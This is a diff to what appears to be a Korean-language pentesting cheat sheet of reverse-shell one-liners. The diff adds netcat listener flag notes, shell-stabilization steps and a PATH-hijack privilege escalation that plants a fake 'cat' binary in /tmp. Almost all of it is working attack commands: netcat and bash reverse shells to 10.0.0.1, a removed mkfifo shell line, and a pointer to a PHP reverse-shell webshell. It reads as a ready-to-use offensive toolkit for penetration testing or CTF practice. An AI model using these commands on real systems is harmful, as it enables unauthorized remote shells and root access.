@@ -1,20 +1,25 @@
 reverse-shell
 #
-`Netcat`
+`listener`
 ```
 rlwrap nc -nvlp <port>
 ```
+- l: 연결을 듣는다
+- v: 상세수준을 설정
+- n: dns를 통해 호스트 이름을 확인하지 않는다.
+- p: 사용할 포트를 지정한다.
+
+#
+`Netcat`
 ```
 nc -e /bin/sh 10.0.0.1 1234
 ```
 잘못된 버전을 사용할 경우 다음과 같이 리버스 셸을 다시 사용할 수 있다
-```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
-```
+
 #
 `Bash`
 ```
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 ```
 #
 `Perl`
@@ -41,7 +46,24 @@ locate
 ```
 /usr/share/webshells/php/php-reverse-shell.php
 ```
-
+#
+`셸 안정화`
+```
+script /dev/null -c bash
+stty raw -echo; fg
+reset
+xterm
+export TERM=xterm
+export SHELL=bash
+```
+#
+`절대 경로 대신 상대 경로를 사용하여 cat binary를 호출하는 것을 볼 수 있다. 악의적인 cat을 만들고 현재 작업 디렉토리를 포함하도록 경로를 수정하면 잘못된 구성을 악용할 수 있으며 권한을 루트로 높일 수 있다.`
+```
+export PATH=/tmp:$PATH
+cd /tmp
+echo '/bin/sh' > cat
+chmod +x cat
+```
 #
 reference
 
